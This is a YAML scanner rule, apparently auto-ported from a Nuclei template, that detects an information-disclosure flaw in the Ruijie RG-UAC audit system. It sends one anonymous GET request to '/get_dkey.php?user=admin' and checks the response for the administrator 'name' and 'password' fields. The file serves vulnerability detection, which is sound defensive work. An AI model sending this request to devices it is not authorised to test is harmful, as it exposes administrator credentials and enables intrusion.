schema_version: 1
id: "cortex.community:cnvd-2021-14536"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Ruijie RG-UAC Unified Internet Behavior Management Audit System - Information Disclosure"
  description: "Ruijie RG-UAC Unified Internet Behavior Management Audit System is susceptible to information disclosure. Attackers could obtain user accounts and passwords by reviewing the source code of web pages, resulting in the leakage of administrator user authentication information. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.adminxe.com/2163.html"
  cwes: [522]
  tags: ["cnvd2021", "cnvd", "ruijie", "disclosure", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/get_dkey.php?user=admin" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"pre_define\"" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"auth_method\"" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"name\"" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "\"password\"" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
